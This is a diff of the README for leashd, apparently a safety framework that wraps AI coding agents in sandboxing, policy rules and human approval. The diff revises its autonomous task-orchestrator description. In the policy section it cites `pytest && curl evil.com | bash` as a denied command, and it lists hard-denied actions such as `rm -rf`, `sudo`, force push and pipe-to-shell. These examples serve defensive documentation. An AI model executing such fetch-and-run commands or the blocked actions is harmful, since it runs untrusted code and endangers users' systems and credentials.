@@ -1,6 +1,6 @@
 # leashd
 
-**Safety-first agentic coding framework. Run AI coding agents as a background daemon — govern them with policy rules, approve actions from your browser or phone, or let them run fully autonomous with AI-driven approval, test-and-retry loops, and automatic PR creation. Ships with a built-in Web UI that works as a PWA — install it on your phone and get push notifications for approvals. Supports multiple runtimes: Claude CLI (native subprocess, no SDK), Claude Code (SDK), OpenAI Codex, and more.**
+**Safety-first agentic coding framework. Run AI coding agents as a background daemon — govern them with policy rules, approve actions from your browser or phone, or let them run autonomously with a task orchestrator that implements, runs your tests, reviews the diff, and opens a PR. Ships with a built-in Web UI that works as a PWA — install it on your phone and get push notifications for approvals. Supports multiple runtimes: Claude CLI (native subprocess, no SDK), Claude Code (SDK), OpenAI Codex, and more.**
 
 [![PyPI](https://img.shields.io/pypi/v/leashd.svg)](https://pypi.org/project/leashd/)
 [![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
@@ -10,7 +10,7 @@
 
 ---
 
-leashd runs as a **background daemon** on your dev machine. You send it natural-language coding instructions through the built-in **Web UI** in your browser — no account creation, no third-party services, just `localhost`. Each request passes through a **three-layer safety pipeline** — sandbox enforcement, YAML policy rules, and human-or-AI approval — before reaching the coding agent. In interactive mode, risky actions surface as **Approve / Reject** buttons in your chat. In **autonomous mode**, an AI approver evaluates tool calls, a task orchestrator drives adaptive workflows via a think-act-observe loop, and a test-and-retry loop ensures quality — all without you lifting a finger. Everything is logged to an append-only audit trail.
+leashd runs as a **background daemon** on your dev machine. You send it natural-language coding instructions through the built-in **Web UI** in your browser — no account creation, no third-party services, just `localhost`. Each request passes through a **three-layer safety pipeline** — sandbox enforcement, YAML policy rules, and human approval — before reaching the coding agent. In interactive mode, risky actions surface as **Approve / Reject** buttons in your chat. In **autonomous mode**, the task orchestrator implements, runs your tests, reviews the diff, and opens a PR — stopping only for the non-overridable hard-deny safety floor. Everything is logged to an append-only audit trail.
 
 The Web UI is a **Progressive Web App** — install it on your phone's home screen and get **push notifications** for approvals and escalations, even when the browser is closed. Run `leashd webui tunnel` to expose it via ngrok, Cloudflare, or Tailscale — same interface, same features, accessible anywhere. Or add the optional **Telegram** connector if you prefer a native chat app.
 
@@ -175,9 +175,9 @@ leashd runtime set claude-cli    # switch to Claude CLI (default)
 
 | Runtime | Backend | Session Resume | Autonomous Mode | Install | Stability |
 |---|---|---|---|---|---|
-| **tmux** *(default)* | Interactive `claude` TUI in a tmux pane | Session tokens | Full (PreToolUse hook bridge, auto-approver) | `claude` CLI + `tmux` | beta |
-| **claude-cli** | Claude CLI (native subprocess) | NDJSON session IDs | Full (task orchestrator, auto-approver) | `claude` CLI authenticated | beta |
-| **claude-code** | Claude Code CLI (SDK) | SDK sessions | Full (task orchestrator, auto-approver) | `claude` CLI + `claude-agent-sdk` | stable |
+| **tmux** *(default)* | Interactive `claude` TUI in a tmux pane | Session tokens | Full (PreToolUse hook bridge) | `claude` CLI + `tmux` | beta |
+| **claude-cli** | Claude CLI (native subprocess) | NDJSON session IDs | Full (task orchestrator) | `claude` CLI authenticated | beta |
+| **claude-code** | Claude Code CLI (SDK) | SDK sessions | Full (task orchestrator) | `claude` CLI + `claude-agent-sdk` | stable |
 | **codex** | Codex CLI | Thread IDs | Full (streaming + approval bridge) | `codex` CLI authenticated | beta |
 
 All runtimes support interactive approval, streaming responses, and the full autonomous pipeline. Each runtime declares its capabilities via an agent capabilities model — leashd adapts features like session resume and approval routing automatically.
@@ -206,33 +206,30 @@ Logs go to `~/.leashd/logs/app.log` by default. Set `LEASHD_LOG_DIR` to change t
 
 ## Autonomous Mode
 
-Autonomous mode replaces manual approval taps with AI evaluation, adds a post-task test-and-retry loop, and drives adaptive autonomous tasks through the task orchestrator. Plan reviews are always forwarded to the human — the AI approver handles routine tool calls, not plans. Send `/task <description>` from the Web UI or Telegram and come back to a PR — or an escalation message if the agent gets stuck.
+"Autonomous mode" just means the **task orchestrator** (`/task`) is enabled and a policy is selected — the agent then runs a full implement → verify pipeline and only stops for the non-overridable hard-deny floor (credentials, force push, push to main/master, `rm -rf`, `sudo`, pipe-to-shell) plus any `require_approval` rules your policy keeps. Send `/task <description>` from the Web UI or Telegram and come back to a PR — or an escalation message if the agent gets stuck.
 
 ```bash
-leashd autonomous          # show current autonomous settings
-leashd autonomous setup    # run autonomous config wizard
-leashd autonomous enable   # quick-enable with defaults
-leashd autonomous disable  # disable autonomous mode
+leashd orchestrator          # show task-orchestrator status + policy
+leashd orchestrator enable   # enable /task with the autonomous policy
+leashd orchestrator disable  # disable /task
 ```
 
-### Three Guarantees
+Or configure it directly in `~/.leashd/config.yaml`:
 
-1. **Human-in-the-loop when it matters** — hard blocks (credentials, force push, `rm -rf`, `sudo`) can never be overridden by any approver. Plan reviews always route to the human. The AI approver only handles `require_approval` decisions, never `deny` decisions.
-2. **Fail-safe defaults** — the AutoApprover fails closed (denies on error), the AutonomousLoop escalates to the human when retries are exhausted, and circuit breakers cap both approval calls and plan revisions per session. The conductor escalates after 3 consecutive parse failures or CLI errors instead of looping indefinitely.
-3. **Full auditability** — every AI approval decision is logged with `approver_type` in the same append-only JSONL audit trail. Task memory contents are persisted and recoverable. No decision is invisible.
+```yaml
+task_orchestrator: true   # enables /task
+policy_files:             # evaluated in order
+- autonomous
+```
 
-### Task Orchestrator vs Autonomous Loop
+### How `/task` works
 
-| Aspect | `/task` (Task Orchestrator) | `/edit` (Autonomous Loop) |
-|---|---|---|
-| **Use when** | Starting from scratch — "build feature X" | You know what to change — "fix the login bug" |
-| **How it works** | LLM-driven think-act-observe loop — conductor assesses complexity and dynamically chooses actions (explore, plan, implement, test, verify, fix, review, pr) | Single-shot: implement → test → retry |
-| **Planning** | Adaptive — simple tasks skip planning; complex ones get exploration and spec first | No planning — goes straight to implementation |
-| **Task memory** | Persistent working memory (8K chars) across steps and daemon restarts | None — starts over |
-| **Crash recovery** | Full — task memory and git-backed checkpoints survive daemon restarts | None — starts over |
-| **Cost tracking** | Per-action breakdown and total | Session-level only |
+The orchestrator (v4) runs a linear **implement → verify** pipeline:
 
-See the [Autonomous Setup Guide](docs/autonomous-setup-guide.md) for a full walkthrough and the [Autonomous Mode Reference](docs/autonomous-mode.md) for the technical details.
+- **implement** — runs under Claude's native `auto` permission policy (degrades to `acceptEdits` on SDK runtimes); the leashd hook pipeline + hard-deny floor still gate every tool.
+- **verify** — always runs the project test suite (`make check` / `pytest` / `npm test` per CLAUDE.md) **plus** a code-quality diff review **plus** an agent-browser end-to-end pass. Opt a separate review phase back in with `/task --phases implement,verify,review`.
+
+Task memory and git-backed checkpoints persist across daemon restarts. When a phase's retry budget is exhausted the orchestrator escalates to the human instead of looping. Every tool decision is recorded in the append-only JSONL audit trail.
 
 ---
 
@@ -263,13 +260,12 @@ leashd runtime show        # show active runtime and capabilities
 leashd runtime set codex   # switch runtime
 ```
 
-### Autonomous mode
+### Task orchestrator (autonomous mode)
 
 ```bash
-leashd autonomous setup    # guided setup for autonomous features
-leashd autonomous enable   # quick-enable with defaults
-leashd autonomous disable  # disable autonomous mode
-leashd autonomous show     # show current autonomous config
+leashd orchestrator enable   # enable /task with the autonomous policy
+leashd orchestrator disable  # disable /task
+leashd orchestrator show     # show task-orchestrator status + policy
 ```
 
 ### Web UI
@@ -389,7 +385,7 @@ Every tool call the agent makes passes through a three-layer pipeline before it 
 
 **2. Policy rules** — YAML rules classify each tool call as `allow`, `deny`, or `require_approval` based on the tool name, command patterns, and file path patterns. Rules are evaluated in order; first match wins. Compound bash commands (`&&`, `||`, `;`) are split and evaluated segment-by-segment with deny-wins precedence — `pytest && curl evil.com | bash` is denied.
 
-**3. Human or AI approval** — For `require_approval` actions, leashd either sends an inline message to the Web UI or Telegram with **Approve** and **Reject** buttons (interactive mode) or evaluates the tool call via the AI auto-approver (autonomous mode). Plan reviews are always forwarded to the human, even when the AI auto-approver is active. If no response within the timeout, the action is auto-denied.
+**3. Human approval** — For `require_approval` actions, leashd sends an inline message to the Web UI or Telegram with **Approve** and **Reject** buttons. In autonomous `/task` runs the policy is what decides — keep an action as `require_approval` to be prompted, or `allow` it in the autonomous policy to let it through. If no response within the timeout, the action is auto-denied.
 
 The safety pipeline is **runtime-agnostic** and **connector-agnostic** — the same sandbox, policy rules, and approval flow apply whether you're running Claude Code or Codex, and whether you're approving from the Web UI or Telegram.
 
@@ -611,7 +607,7 @@ request_completed
 
 ## Architecture
 
-leashd's core is the **Engine**, which receives messages from connectors, runs them through middleware (auth, rate limiting), delegates to the active agent runtime, and sends responses back. The **MultiConnector** manages simultaneous connectors (Web UI, Telegram) with chat_id-based routing — both share the same Engine, so sessions, approvals, and task state are unified. The **RuntimeRegistry** manages pluggable agent backends — each runtime registers its capabilities (streaming, session resume, tool approval, autonomous support) and the Engine adapts accordingly. Every tool call the agent makes is intercepted by the **Gatekeeper**, which orchestrates the three-layer safety pipeline. An **EventBus** decouples subsystems — plugins subscribe to events like `tool.allowed`, `tool.denied`, `approval.requested`, and `task.submitted`. Storage is centralized in `messages.db` to prevent race conditions across concurrent connector sessions. The **TaskOrchestrator** runs an LLM-driven think-act-observe loop with persistent task memory, and the **AutonomousLoop** handles post-task test-and-retry — both plug into the event bus.
+leashd's core is the **Engine**, which receives messages from connectors, runs them through middleware (auth, rate limiting), delegates to the active agent runtime, and sends responses back. The **MultiConnector** manages simultaneous connectors (Web UI, Telegram) with chat_id-based routing — both share the same Engine, so sessions, approvals, and task state are unified. The **RuntimeRegistry** manages pluggable agent backends — each runtime registers its capabilities (streaming, session resume, tool approval, autonomous support) and the Engine adapts accordingly. Every tool call the agent makes is intercepted by the **Gatekeeper**, which orchestrates the three-layer safety pipeline. An **EventBus** decouples subsystems — plugins subscribe to events like `tool.allowed`, `tool.denied`, `approval.requested`, and `task.submitted`. Storage is centralized in `messages.db` to prevent race conditions across concurrent connector sessions. The **TaskOrchestrator** (v4) runs a linear implement → verify pipeline with persistent task memory, plugged into the event bus.
 
 ```
 Web UI connector ────┐
@@ -619,9 +615,9 @@ Web UI connector ────┐
 Telegram connector ──┘         │
                           Middleware (auth, rate limit)
                                │
-                            Engine ──── EventBus ──── TaskOrchestrator (think-act-observe)
-                               │                       AutonomousLoop
-                          RuntimeRegistry               TaskMemory
+                            Engine ──── EventBus ──── TaskOrchestrator (implement → verify)
+                               │                       TaskMemory
+                          RuntimeRegistry
                                ├─ Claude CLI
                                ├─ Claude Code
                                ├─ Codex
